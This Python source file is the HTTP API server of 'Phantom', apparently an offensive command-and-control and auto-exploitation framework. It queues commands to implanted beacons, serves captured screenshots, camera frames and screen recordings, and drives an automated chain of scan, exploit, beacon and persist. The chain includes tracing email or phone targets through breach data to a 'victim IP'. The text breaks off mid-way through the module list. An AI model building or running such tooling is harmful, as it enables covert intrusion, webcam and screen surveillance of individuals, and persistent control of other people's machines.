"""
Phantom Electron API Server
============================
Local HTTP bridge between the Electron frontend and Phantom's core.
Started by the Electron main process on a random high port.
Talks JSON to Electron, delegates to the existing Phantom modules.
"""

import argparse
import html
import json
import os
import re
import secrets
import shlex
import sys
import uuid
import time
import threading
import traceback
from datetime import datetime
from typing import Any, Optional

# Ensure the project root is on sys.path so Phantom imports work
_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

try:
    from aiohttp import web
except ImportError:
    print("[api] ERROR: aiohttp not installed. Run: pip install aiohttp", file=sys.stderr)
    sys.exit(1)

try:
    from phantom.core.c2_server import server_instance, c2_state, C2Server
    from phantom.core.session import session
    from phantom.core.scope import is_in_scope
    from phantom.core.automode import run_auto_mode
    from phantom.utils.state import status as state_status, set_flag, use_mtls
    from phantom.utils.c2_crypto import regenerate_api_token
    from phantom.utils.paths import certs_dir, certs_exist, sessions_dir
    from phantom.api.backend import backend_dispatcher
except ImportError as e:
    print(f"[api] ERROR: Phantom imports failed: {e}", file=sys.stderr)
    traceback.print_exc()
    sys.exit(1)


# ── Helpers ────────────────────────────────────────────────────────────────

def _json(data: Any, status: int = 200) -> web.Response:
    return web.json_response(data, status=status, dumps=lambda o: json.dumps(o, default=str))


def _error(msg: str, status: int = 400) -> web.Response:
    return _json({"error": msg}, status=status)


# ── Session auto-persistence ────────────────────────────────────────────────
# Electron edits the live session through the API; the CLI session object is
# in-memory only, so every app restart wiped target/scope/notes/history.
# The live session is now mirrored to data/sessions/_auto.json on every
# mutation and restored at server boot — the app reopens where it left off.

_AUTO_SESSION_FIELDS = ("target", "scope", "lhost", "lport",
                        "active_wordlist", "notes", "history")


def _auto_session_file() -> str:
    """Lazy path (env-respecting sessions dir) so tests can isolate it."""
    return os.path.join(sessions_dir(), "_auto.json")


def _persist_session() -> None:
    """Atomically mirror the live session to _auto.json (best effort)."""
    try:
        path = _auto_session_file()
        data = {k: getattr(session, k, None) for k in _AUTO_SESSION_FIELDS}
        data["saved_at"] = datetime.now().isoformat(timespec="seconds")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, default=str)
        os.replace(tmp, path)
    except Exception:
        pass


def _restore_session() -> None:
    """Apply the last auto-saved session at server boot (best effort)."""
    try:
        path = _auto_session_file()
        if not os.path.exists(path):
            return
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
        for k in _AUTO_SESSION_FIELDS:
            if k in data and data[k] not in (None, "", [], 0):
                setattr(session, k, data[k])
        if data.get("target"):
            print(f"[api] Session restored: {data['target']} "
                  f"(notes={len(session.notes or [])}, "
                  f"history={len(session.history or [])})", flush=True)
    except Exception:
        pass


def _beacon_status(last_seen_str: str, info: dict | None = None) -> str:
    # confirmed shutdown beats recency: an exited beacon never shows LIVE
    if info and info.get("status") == "exited":
        return "EXITED"
    if not last_seen_str:
        return "DEAD"
    try:
        diff = (datetime.now() - datetime.fromisoformat(last_seen_str)).total_seconds()
    except ValueError:
        return "DEAD"
    if diff < 15:
        return "LIVE"
    if diff < 60:
        return "IDLE"
    return "DEAD"


def _beacon_age(last_seen_str: str) -> str:
    if not last_seen_str:
        return "Never"
    try:
        diff = int((datetime.now() - datetime.fromisoformat(last_seen_str)).total_seconds())
    except ValueError:
        return "Never"
    if diff < 60:
        return f"{diff}s ago"
    if diff < 3600:
        return f"{diff // 60}m ago"
    return f"{diff // 3600}h ago"


def _c2_beacons_list() -> list[dict]:
    beacons = c2_state.get_beacons()
    result = []
    for bid, info in beacons.items():
        ls = info.get("last_seen", "")
        result.append({
            "id": bid,
            "source_ip": info.get("source_ip", "—"),
            "user": info.get("user", ""),
            "hostname": info.get("hostname", ""),
            "os": info.get("os", "—"),
            "status": _beacon_status(ls, info),
            "last_seen": ls,
            "last_seen_display": _beacon_age(ls),
            "tasks_pending": len(c2_state.tasks.get(bid, [])),
            "session_resumed_at": info.get("session_resumed_at"),
        })
    return result


def _c2_tasks_dump() -> dict[str, list[dict]]:
    out: dict[str, list[dict]] = {}
    for bid, task_list in c2_state.tasks.items():
        out[bid] = []
        for t in task_list:
            out[bid].append({
                "task_id": t.get("task_id", ""),
                "command": t.get("command", ""),
                # a leased task is on its way to the beacon; the result ends
                # up in the results section once the beacon checks in
                "status": "sent" if t.get("_leased_at") else "pending",
                "result": None,
                "sent_at": t.get("_sent_at"),
                "done_at": None,
            })
    # also include results that are already resolved (result records carry
    # the originating command + a friendly artifact note instead of raw b64)
    for bid, res_list in c2_state.results.items():
        if bid not in out:
            out[bid] = []
        for r in res_list:
            out[bid].append({
                "task_id": r.get("task_id", ""),
                "command": r.get("command", ""),
                "status": "done",
                "result": r.get("output", ""),
                "done_at": r.get("time", ""),
            })
    return out


# ── API Routes ─────────────────────────────────────────────────────────────

routes = web.RouteTableDef()


@routes.get("/api/c2/artifacts")
async def c2_artifacts(_request: web.Request) -> web.Response:
    """List beacon binary artifacts (screenshots / camera frames / downloads)
    as JSON — the Electron C2 dashboard renders images from these."""
    from phantom.utils.paths import data_dir
    out = []
    for subdir in ("screenshots", "downloads", "remote", "recordings",
                   "recordings/live"):
        d = os.path.join(data_dir(), subdir)
        if not os.path.isdir(d):
            continue
        try:
            for name in sorted(os.listdir(d), reverse=True)[:40]:
                p = os.path.join(d, name)
                if not os.path.isfile(p):
                    continue
                st = os.stat(p)
                # classify by EXTENSION, not subdir: the CLI/telegram path
                # (format_beacon_output) saves screenshots + camera frames
                # under downloads/ — those must render as images in Electron
                # too, not just the server add_result path (screenshots/)
                low = name.lower()
                kind = "image" if low.endswith((".bmp", ".png", ".jpg",
                                                 ".jpeg", ".gif")) else (
                    "video" if low.endswith((".mp4", ".mkv", ".webm")) else "file")
                out.append({
                    "name": name, "kind": kind, "dir": subdir,
                    "size": st.st_size,
                    "mtime": datetime.fromtimestamp(st.st_mtime)
                        .strftime("%Y-%m-%d %H:%M:%S"),
                })
        except OSError:
            continue
    return _json({"artifacts": out})


@routes.get("/api/c2/artifact")
async def c2_artifact(request: web.Request) -> web.Response:
    """Serve ONE artifact for Electron. Default: base64 JSON (images). With
    ?raw=1: raw bytes with the right media type (videos go through this so
    a <video> element can stream them).
    Path-traversal safe: only the allowed data/ subdirs.
    ?dir=screenshots|downloads|remote|recordings|recordings/live &name=<file>"""
    from phantom.utils.paths import data_dir
    subdir = request.query.get("dir", "screenshots")
    name = request.query.get("name", "")
    if subdir not in ("screenshots", "downloads", "remote", "recordings",
                      "recordings/live") or not name:
        return _error("invalid artifact request", 400)
    safe = os.path.basename(name.replace("\\", "/"))
    path = os.path.join(data_dir(), subdir, safe)
    if not os.path.isfile(path):
        return _error("artifact not found", 404)
    low = safe.lower()
    media = ("image/bmp" if low.endswith((".bmp", ".dib")) else
             "image/jpeg" if low.endswith((".jpg", ".jpeg")) else
             "image/png" if low.endswith(".png") else
             "video/mp4" if low.endswith(".mp4") else
             "video/webm" if low.endswith(".webm") else
             "application/octet-stream")
    if request.query.get("raw") == "1":
        with open(path, "rb") as fh:
            return web.Response(body=fh.read(), content_type=media)
    import base64 as _b64
    with open(path, "rb") as fh:
        data = _b64.b64encode(fh.read()).decode()
    return _json({"name": safe, "dir": subdir, "media": media, "data": data})


@routes.get("/api/c2/recordings/live")
async def c2_recordings_live(request: web.Request) -> web.Response:
    """Progressive screen-stream status for a beacon: how many segments have
    arrived, the growing mp4 (if ffmpeg muxed one), and the last segment
    time. Electron's Recordings tab polls this for the live view."""
    beacon_id = request.query.get("beacon_id", "")
    if not beacon_id:
        return _error("missing beacon_id", 400)
    from phantom.utils.paths import data_dir
    segs = c2_state.get_live_segments(beacon_id)
    safe = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
    mp4 = os.path.join(data_dir(), "recordings", "live", f"{safe}_live.mp4")
    return _json({
        "beacon_id": beacon_id,
        "segments": segs,
        "count": len(segs),
        "mp4": os.path.basename(mp4) if os.path.isfile(mp4) else "",
        "last": segs[-1]["time"] if segs else "",
    })


# ── C2 State ───────────────────────────────────────────────────────────────

@routes.get("/api/c2/state")
async def c2_state_get(_request: web.Request) -> web.Response:
    """Return full C2 state: listener info, beacons, tasks."""
    active = server_instance.thread is not None and server_instance.thread.is_alive()
    proto = "HTTPS" if (active and getattr(server_instance, "ssl_context", None)) else "HTTP"
    return _json({
        "listener": {
            "active": active,
            "proto": proto,
            "host": server_instance.host,
            "port": server_instance.port,
            "mtls": use_mtls(),
            "certs_present": certs_exist(),
        },
        "beacons": _c2_beacons_list(),
        "tasks": _c2_tasks_dump(),
    })


@routes.post("/api/c2/listener/start")
async def c2_listener_start(_request: web.Request) -> web.Response:
    """Start the C2 listener (default HTTPS + mTLS)."""
    try:
        server_instance.start(
            host=session.lhost or "0.0.0.0",
            port=session.lport or 8080,
            use_ssl=True,
        )
        return _json({"status": "started", "host": server_instance.host, "port": server_instance.port})
    except Exception as e:
        return _error(f"Failed to start listener: {e}", 500)


@routes.post("/api/c2/listener/stop")
async def c2_listener_stop(_request: web.Request) -> web.Response:
    """Stop the C2 listener."""
    server_instance.stop()
    return _json({"status": "stopped"})


@routes.post("/api/c2/beacon/{beacon_id}/task")
async def c2_beacon_task(request: web.Request) -> web.Response:
    """Queue a command for a specific beacon."""
    beacon_id = request.match_info["beacon_id"]
    body = await request.json()
    command = (body or {}).get("command", "")
    if not command:
        return _error("Missing 'command' field")
    task_id = c2_state.queue_task(beacon_id, command)
    return _json({"task_id": task_id, "beacon_id": beacon_id})


@routes.post("/api/c2/beacon/{beacon_id}/kill")
async def c2_beacon_kill(request: web.Request) -> web.Response:
    """Queue a kill command for a beacon."""
    beacon_id = request.match_info["beacon_id"]
    task_id = c2_state.queue_task(beacon_id, "exit")
    return _json({"task_id": task_id, "status": "kill queued"})


@routes.post("/api/c2/config/rotate-api-token")
async def c2_config_rotate_token(_request: web.Request) -> web.Response:
    """Rotate the API token."""
    try:
        token = regenerate_api_token()
        return _json({"token": token, "status": "rotated"})
    except Exception as e:
        return _error(str(e), 500)


@routes.post("/api/c2/config/mtls-toggle")
async def c2_config_mtls_toggle(_request: web.Request) -> web.Response:
    """Toggle mTLS on/off."""
    current = use_mtls()
    set_flag("PHANTOM_MTLS_REQUIRED", not current)
    return _json({"mtls": not current})


# ── Session ────────────────────────────────────────────────────────────────

@routes.get("/api/session")
async def session_get(_request: web.Request) -> web.Response:
    """Return current session state.

    `knowledge` carries the bridged facts the auto-mode writes into the
    manual session (services/creds/OS, internal peers, cloud, EDR gaps,
    mobile surfaces), so the Electron panels show the same truth as the CLI
    without shipping the whole knowledge_base blob.
    """
    kb = session.knowledge_base or {}
    knowledge = {
        "services": kb.get("services") or [],
        "os_info": kb.get("os_info") or {},
        "creds_found": kb.get("creds_found") or [],
        "next_targets": kb.get("next_targets") or [],
        "beacon_deployed": bool(kb.get("beacon_deployed")),
        "persistence_set": bool(kb.get("persistence_set")),
        "cloud_findings": kb.get("cloud_findings") or {},
        "edr_gaps": kb.get("edr_gaps") or [],
        "mobile_surface": kb.get("mobile_surface") or {},
        "k8s_escape": bool(kb.get("k8s_escape")),
    }
    return _json({
        "target": session.target or "",
        "scope": session.scope or [],
        "lhost": session.lhost or "",
        "lport": session.lport or 0,
        "active_wordlist": session.active_wordlist or "",
        "notes": session.notes or [],
        "results": session.results or {},
        "history": session.history or [],
        "knowledge": knowledge,
    })


@routes.post("/api/session/set")
async def session_set(request: web.Request) -> web.Response:
    """Set session fields (target / scope / lhost / lport).

    The Electron Session panel has no CLI prompt, so this endpoint is the
    only way frontend edits reach the backend session. Mirrors the CLI
    `set` semantics: scope check on target, fresh WorldModel per target.
    """
    body = await request.json() or {}
    key = str(body.get("key", "")).strip().lower()
    value = body.get("value")

    if key == "target":
        target = str(value or "").strip()
        if not target:
            # explicit CLEAR: unset the target without wiping the network
            # device store or the WorldModel's discovered hosts
            was = session.target
            session.target = ""
            _persist_session()
            return _json({"status": "ok", "key": "target", "value": "",
                          "cleared": bool(was)})
        if session.scope and not is_in_scope(target, session.scope):
            return _error(f"{target} is out of current scope ({', '.join(session.scope)})")
        if session.target and target != session.target:
            # a new target = a new engagement: fresh shared WorldModel,
            # but discovered NETWORK devices are re-seeded right after so
            # the map never empties when the operator switches targets
            try:
                from phantom.core.knowledge import reset_wm
                reset_wm(target=target)
            except Exception:
                pass
            try:
                from phantom.core.netmap import reseed_known_hosts
                reseed_known_hosts()
            except Exception:
                pass
        session.target = target
        _persist_session()
        return _json({"status": "ok", "key": "target", "value": session.target})

    if key == "scope":
        items = value if isinstance(value, list) else str(value or "").split(",")
        session.scope = [str(s).strip() for s in items if str(s).strip()]
        _persist_session()
        return _json({"status": "ok", "key": "scope", "value": session.scope})

    if key == "lhost":
        session.lhost = str(value or "").strip()
        _persist_session()
        return _json({"status": "ok", "key": "lhost", "value": session.lhost})

    if key == "lport":
        try:
            session.lport = int(value)
        except (TypeError, ValueError):
            return _error("lport must be an integer")
        _persist_session()
        return _json({"status": "ok", "key": "lport", "value": session.lport})

    return _error(f"Unknown session key: {key}")


@routes.post("/api/session/notes")
async def session_notes_add(request: web.Request) -> web.Response:
    """Append an engagement note. Notes added in Electron used to live only
    in the frontend store and were wiped by the 2s session poll — now they
    reach the backend session (and survive restarts via _auto.json)."""
    body = await request.json() or {}
    note = str(body.get("note", "")).strip()
    if not note:
        return _error("Empty note")
    session.add_note(note)
    _persist_session()
    return _json({"status": "ok", "notes": session.notes})


@routes.post("/api/session/history")
async def session_history_add(request: web.Request) -> web.Response:
    """Append a command-history entry (used by module executions from
    Electron so the session record matches what the CLI would log)."""
    body = await request.json() or {}
    cmd = str(body.get("cmd", "")).strip()
    if not cmd:
        return _error("Empty command")
    session.add_history(cmd)
    _persist_session()
    return _json({"status": "ok", "history": session.history})


@routes.post("/api/session/run")
async def session_run(_request: web.Request) -> web.Response:
    """Run the ADAPTIVE next step (reads target type + findings + reasoning)."""
    if not session.target:
        return _error("No target set")

    # Run in background thread so the API doesn't block
    def _run():
        from phantom.core.shell import PhantomShell
        shell = PhantomShell()
        shell.auto_run = True
        try:
            shell.do_run("")
        except Exception:
            traceback.print_exc()

    threading.Thread(target=_run, daemon=True).start()
    return _json({"status": "started"})


@routes.post("/api/session/profile/save")
async def session_profile_save(request: web.Request) -> web.Response:
    """Save current session as a profile."""
    body = await request.json()
    name = (body or {}).get("name", "")
    if not name:
        return _error("Missing 'name' field")

    profile_dir = os.path.expanduser("~/.phantom/profiles")
    os.makedirs(profile_dir, exist_ok=True)
    profile_path = os.path.join(profile_dir, f"{name}.json")
    data = {
        "target": session.target,
        "scope": session.scope,
        "active_wordlist": session.active_wordlist,
    }
    with open(profile_path, "w") as f:
        json.dump(data, f, indent=2)
    return _json({"status": "saved", "name": name})


@routes.post("/api/session/profile/load")
async def session_profile_load(request: web.Request) -> web.Response:
    """Load a session profile."""
    body = await request.json()
    name = (body or {}).get("name", "")
    if not name:
        return _error("Missing 'name' field")

    profile_path = os.path.expanduser(f"~/.phantom/profiles/{name}.json")
    if not os.path.exists(profile_path):
        return _error(f"Profile '{name}' not found", 404)

    with open(profile_path, "r", encoding="utf-8") as f:
        data = json.load(f)

    if isinstance(data.get("target"), str):
        session.target = data["target"]
    if isinstance(data.get("scope"), list):
        session.scope = [str(s) for s in data["scope"]]
    if isinstance(data.get("active_wordlist"), str):
        session.active_wordlist = data["active_wordlist"]

    return _json({"status": "loaded", "name": name, "target": session.target})


# ── Learning engine (experience memory) ─────────────────────────────────────
# The case-based memory is the one part of Phantom that IMPROVES with use:
# it records (situation, technique, outcome, cause, repair) and reorders
# already-allowed moves so a wall hit before is not hit the same way again.
# These endpoints let the desktop app show what was learned, why, and let
# the operator forget it deliberately.


def _experience_store():
    from phantom.automation.brain.experience import CaseStore
    return CaseStore(enabled=True)          # global store (on disk)


@routes.get("/api/learning")
async def learning_get(_request: web.Request) -> web.Response:
    """Current state of the learning memory (survives across engagements)."""
    try:
        store = _experience_store()
        stats = store.stats()
        recent = sorted(store.episodes, key=lambda e: e.ts)[-40:]
        from phantom.automation.brain.experience import consolidate
        return _json({
            "stats": stats,
            "patterns": consolidate.pattern_table(store.episodes,
                                                  min_n=2),
            "causes": consolidate.cause_profile(store.episodes),
            "recent": [e.to_dict() for e in reversed(recent)],
            "labels": _cause_labels(),
        })
    except Exception as exc:
        return _json({"stats": {"episodes": 0, "enabled": False},
                      "recent": [], "error": str(exc)})


@routes.post("/api/learning/reset")
async def learning_reset(_request: web.Request) -> web.Response:
    """Forget the cross-engagement memory (deliberate, irreversible)."""
    try:
        store = _experience_store()
        store.clear()
        return _json({"status": "cleared", "episodes": 0})
    except Exception as exc:
        return _error(f"reset failed: {exc}")


def _cause_labels() -> dict:
    try:
        from phantom.automation.brain.experience import causes
        return dict(causes.CAUSE_LABEL)
    except Exception:
        return {}


# ── Auto-Mode (job manager: per-run state, cooperative stop) ──────────────
# The old module globals (_auto_stream/_auto_current_step/_auto_done) made
# every run share ONE buffer: a second run reset the first one's stream
# mid-flight and "stop" only flipped a bool the agent never read. Each run
# is now a job with its OWN stream buffer and a stop Event the agent checks
# between planner iterations (cooperative: a scan already in flight
# finishes, the loop exits at the next boundary).

_auto_lock = threading.Lock()   # guards every job's stream buffer


class AutoJob:
    """One auto-mode run: dedicated stream, stop signal, lifecycle."""

    def __init__(self, job_id: str, targets: list, mode: str,
                 profile: str, goal: str) -> None:
        self.id = job_id
        self.verbose = False
        self.targets = list(targets)
        self.mode = mode
        self.profile = profile
        self.goal = goal
        self.stream: list[dict] = []
        self.current_step = -1
        self.done = False
        self.stop_event = threading.Event()
        self.thread: Optional[threading.Thread] = None
        self.started_at = time.time()
        self.error: Optional[str] = None

    def callback(self, kind: str, data: dict) -> None:
        with _auto_lock:
            self.stream.append({"kind": kind, "data": data})

    def drain(self) -> list[dict]:
        with _auto_lock:
            events = self.stream[:]
            self.stream.clear()
        return events


class AutoJobManager:
    """Registry of auto-mode runs. One ACTIVE run at a time (a new run
    replaces it), finished runs are kept briefly for status queries and
    pruned after an hour so the process never accumulates state."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._jobs: dict[str, AutoJob] = {}
        self._active_id: Optional[str] = None

    def create(self, targets: list, mode: str, profile: str,
               goal: str, verbose: bool = False) -> AutoJob:
        with self._lock:
            job = AutoJob(f"job_{uuid.uuid4().hex[:8]}", targets, mode,
                          profile, goal)
            job.verbose = verbose
            self._jobs[job.id] = job
            self._active_id = job.id
            self._prune_locked()
            return job

    def active(self) -> Optional[AutoJob]:
        with self._lock:
            if self._active_id:
                return self._jobs.get(self._active_id)
            return None

    def stop_active(self) -> Optional[AutoJob]:
        """Request a cooperative stop: set the Event (the agent's drive loop
        observes it at the next iteration boundary and halts)."""
        with self._lock:
            job = self._jobs.get(self._active_id) if self._active_id else None
            if job and not job.done:
                job.stop_event.set()
                return job
            return None

    def _prune_locked(self) -> None:
        now = time.time()
        for jid in [j for j, jb in self._jobs.items()
                    if jb.done and now - jb.started_at > 3600]:
            self._jobs.pop(jid, None)


auto_jobs = AutoJobManager()


@routes.post("/api/automode/run")
async def automode_run(request: web.Request) -> web.Response:
    """Start the auto-mode engine as a managed job."""
    body = await request.json() or {}
    targets = [str(t).strip() for t in body.get("targets", []) if str(t).strip()]
    mode = body.get("mode", "default")
    profile = body.get("profile", "enterprise")
    goal = body.get("goal", "deliver")
    agents = body.get("agents", 0)
    resume = body.get("resume", "")
    llm = bool(body.get("llm", False))
    experience = bool(body.get("experience", False))
    verbose = bool(body.get("verbose", False))

    if not targets:
        return _error("No targets specified")

    job = auto_jobs.create(targets, mode, profile, goal, verbose=verbose)
    session.target = targets[0]

    def _run(job: AutoJob) -> None:
        try:
            run_auto_mode(
                targets=targets,
                aggressive=(mode == "aggressive"),
                stealth=(mode == "stealth"),
                speed=(mode == "speed"),
                plan=False,
                verbose=verbose,
                agents=agents,
                goal=goal,
                profile=profile,
                on_event=job.callback,
                handoff_c2=False,
                llm=llm,
                experience=experience,
                resume=resume,
                stop_event=job.stop_event,
            )
        except Exception as exc:
            # Never die silently: surface the crash in the UI stream. A
            # UnicodeEncodeError from the legacy Windows console renderer
            # used to kill this thread before any event was emitted,
            # leaving the UI with just "sequence complete".
            traceback.print_exc()
            job.error = str(exc)
            job.callback("failed", {"output": f"auto-mode crashed: {exc}"})
        finally:
            job.done = True
            job.callback("halt", {"reason": (
                "stopped by operator" if job.stop_event.is_set()
                else "sequence complete")})

    job.thread = threading.Thread(target=_run, args=(job,), daemon=True)
    job.thread.start()
    return _json({"status": "started", "job_id": job.id,
                  "targets": targets, "mode": mode})


@routes.get("/api/automode/stream")
async def automode_stream(_request: web.Request) -> web.Response:
    """Poll for live auto-mode events of the ACTIVE job."""
    job = auto_jobs.active()
    if job is None:
        return _json({"done": True, "step_updates": [], "current_step": -1,
                      "log": []})
    events = job.drain()

    step_updates = []
    logs = []
    step_map = {
        "scan": 0, "osint": 1, "os_detect": 2,
        "web_recon": 3, "web_probe": 3, "http_probe": 3,
        "cve_correlate": 4, "service_exploit": 4, "exploit": 4,
        "creds": 5, "ssh_login": 5, "web_creds": 5, "breach_check": 5,
        "beacon_deploy": 6, "beacon_via_rce": 6, "inject_beacon": 6,
        "persist": 7, "persistence_install": 7,
    }

    for ev in events:
        kind = ev.get("kind", "")
        data = ev.get("data", {})
        cap = (data.get("capability") or "").lower()

        if kind == "run":
            matched_step = None
            for key, idx in step_map.items():
                if key in cap:
                    matched_step = idx
                    step_updates.append({"step": idx, "status": "running", "detail": cap[:40]})
                    break
            if matched_step is not None:
                job.current_step = matched_step
            # the log carries the REAL command + the planner's WHY + the
            # stealth badge so the UI renders the action, not just its name
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[▶] Running: {data.get('banner') or data.get('capability')}",
                "level": "info",
                "command": data.get("command") or "",
                "reason": data.get("reason") or "",
                "stealth": data.get("stealth_level") or "",
            })
        elif kind == "found":
            findings = data.get("findings", [])
            for key, idx in step_map.items():
                if key in cap:
                    step_updates.append({"step": idx, "status": "done", "detail": ", ".join(findings[:3])})
                    job.current_step = idx
                    break
            # human-readable value dump: each finding key carries its value
            # (service:tcp/445 = microsoft-ds, os:detected = Windows ...) so
            # the operator sees WHAT was found, not just fact names.
            # Credential findings are REDACTED here: the UI stream and the
            # persisted session mirror must never carry raw passwords/OTPs
            # (the WorldModel keeps them for the kill chain; the operator's
            # raw report is the only surface that shows the real values).
            from phantom.utils.redact import redact as _redact_values
            values = _redact_values(data.get("values") or {})
            parts = []
            for fkey in findings[:6]:
                v = values.get(fkey)
                if v:
                    parts.append(f"{fkey} = {str(v)[:60]}")
                else:
                    parts.append(fkey)
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[+] {data.get('capability')}: {', '.join(parts)}",
                "level": "success",
            })
        elif kind == "failed":
            for key, idx in step_map.items():
                if key in cap:
                    step_updates.append({"step": idx, "status": "failed",
                                         "detail": (data.get("reason")
                                                    or data.get("output")
                                                    or "execution failed")[:60]})
                    break
            reason = (data.get("reason") or data.get("output") or "").strip()
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[ERROR] Failed: {cap} — {reason[:120]}" if reason
                        else f"[ERROR] Failed: {cap} (no output — see reasoning log)",
                "level": "error",
            })
        elif kind == "note":
            # clean run that produced no new facts: show WHY instead of an
            # empty success line (e.g. os_detect on a host nmap cannot
            # fingerprint: "Too many fingerprints match this host")
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[i] {cap}: {data.get('detail', 'no new findings')}",
                "level": "dim",
            })
        elif kind == "tool_missing":
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[!] Tool missing: {cap} needs {', '.join(data.get('tools', []))}",
                "level": "warn",
            })
        elif kind == "deferred":
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[~] Deferred: {cap} — precondition not met yet",
                "level": "dim",
            })
        elif kind == "recover":
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[↻] Recovery {data.get('recovery', '')}: "
                        f"{data.get('detail', 're-arming failed capabilities')}",
                "level": "warn",
            })
        elif kind == "hunt_probe":
            if not job.verbose:
                continue
            # behavioural hunt probe lines: endpoint + signals, trimmed
            req = data.get("request", {})
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[hunt] {req.get('probe', '')} {req.get('method', 'GET')} "
                        f"{req.get('path', '')} → {req.get('signals', '')}".strip(),
                "level": "dim",
            })
        elif kind == "blocked":
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[!] Blocked: {data.get('reason', '')[:120]}",
                "level": "warn",
            })
        elif kind == "beacon_up":
            step_updates.append({"step": 6, "status": "done", "detail": data.get("beacon_id", "")})
            job.current_step = 6
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[★] BEACON UP: {data.get('beacon_id', '')}",
                "level": "success",
            })
        elif kind == "waiting":
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[⏳] {data.get('detail', 'waiting for the human')} "
                        f"({data.get('remaining', '?')}s left)",
                "level": "info",
            })
        elif kind == "halt":
            logs.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "text": f"[■] {data.get('reason', 'halt')}",
                "level": "info",
            })
        elif kind == "inference":
            if not job.verbose:
                continue
            # render the DEDUCED findings with their values — the operator
            # must see WHAT was learned ("os: Windows Server 2019", not just
            # "inference"); secret values are redacted for the UI stream
            from phantom.utils.redact import redact as _redact_values
            fins = _redact_values(data.get("findings") or [])
            if fins:
                parts = []
                for f in fins[:4]:
                    v = f.get("value")
                    detail = ""
                    if isinstance(v, dict):
                        detail = ", ".join(str(x) for x in list(v.values())[:2] if x)
                    elif v:
                        detail = str(v)
                    parts.append(f"{f.get('kind')}:{f.get('key')} = {detail}".rstrip(" ="))
                logs.append({
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "text": f"[~] Inference: {'; '.join(parts)}",
                    "level": "dim",
                })
        elif kind == "reason":
            if not job.verbose:
                continue
            hyps = data.get("hypotheses") or []
            if hyps:
                shown = "; ".join(
                    f"{h.get('capability')} ({h.get('reason', '')[:60]})"
                    for h in hyps[:3])
                logs.append({
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "text": f"[?] Hypothesis: {shown}",
                    "level": "dim",
                })
        elif kind == "plan":
            steps = data.get("steps") or []
            if steps:
                strategy = data.get("strategy") or ""
                logs.append({
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "text": f"[≡] Plan ({strategy or 'generic'}): "
                            f"{' → '.join(steps[:8])}" +
                            (f" …+{len(steps) - 8}" if len(steps) > 8 else ""),
                    "level": "info",
                })

    return _json({
        "done": job.done,
        "step_updates": step_updates,
        "current_step": job.current_step,
        "log": logs,
    })


@routes.get("/api/automode/status")
async def automode_status(_request: web.Request) -> web.Response:
    """Current auto-mode state without consuming the event stream."""
    job = auto_jobs.active()
    if job is None:
        return _json({"running": False, "current_step": -1, "job_id": None})
    return _json({
        "running": not job.done,
        "current_step": job.current_step,
        "job_id": job.id,
    })


@routes.post("/api/automode/stop")
async def automode_stop(_request: web.Request) -> web.Response:
    """Request a cooperative stop of the active auto-mode run. The agent
    observes the event at the next iteration boundary and halts; a long
    scan already in flight finishes first (never killed mid-action)."""
    job = auto_jobs.stop_active()
    if job is None:
        return _json({"status": "stopped", "note": "no active run"})
    return _json({"status": "stopped", "job_id": job.id})


@routes.post("/api/automode/plan")
async def automode_plan(request: web.Request) -> web.Response:
    """Dry-run: return the planned kill chain without executing."""
    body = await request.json() or {}
    targets = body.get("targets", [])
    mode = body.get("mode", "default")
    profile = body.get("profile", "enterprise")
    goal = body.get("goal", "deliver")

    if not targets:
        return _error("No targets specified")

    # Build a plan based on target type
    plan = []
    for t in targets:
        t = t.strip()
        if "@" in t or t.startswith("+"):
            plan.append(f"[{t}] Classify → IDENTITY (email/phone)")
            plan.append(f"[{t}] OSINT → breach lookup → persona → victim IP")
            plan.append(f"[{t}] After victim IP: SCAN → EXPLOIT → BEACON → PERSIST")
        elif t.startswith(("http://", "https://")):
            plan.append(f"[{t}] Classify → URL")
            plan.append(f"[{t}] WEB RECON → CVE CORRELATE → EXPLOIT → BEACON")
        elif "/" in t:
            plan.append(f"[{t}] Classify → CIDR range")
            plan.append(f"[{t}] PING SWEEP → per-host SCAN → EXPLOIT → BEACON")
        else:
            plan.append(f"[{t}] Classify → IP/DOMAIN")
            plan.append(f"[{t}] SCAN ({'stealth' if mode == 'stealth' else 'full'}) → OS DETECT")
            plan.append(f"[{t}] CVE CORRELATE → {'STEALTH EXPLOIT' if mode == 'stealth' else 'EXPLOIT'} → CREDS")
            plan.append(f"[{t}] BEACON ({'minimal' if mode == 'stealth' else 'standard'} dropper)")
            plan.append(f"[{t}] PERSIST (auto-detect OS)")
            plan.append(f"[{t}] Handoff to C2 terminal")

    plan.append("═══ GENERATE DUAL REPORT (raw audit + sanitized client) ═══")

    if mode == "aggressive":
        plan.insert(2, f"[{targets[0]}] AGGRESSIVE: online brute force, vuln scan, loud tools")
    if mode == "speed":
        plan.append("   SPEED: exploit first viable opening, skip remaining targets")

    return _json({"plan": plan})


# ── Manual modules ─────────────────────────────────────────────────────────

_MODULES = {
    "scan": ("phantom.modules.scan", "ScanModule"),
    "osint": ("phantom.modules.osint", "OsintModule"),
    "wifi": ("phantom.modules.wifi", "WifiModule"),
    "web": ("phantom.modules.web", "WebModule"),
    "brute": ("phantom.modules.brute", "BruteModule"),
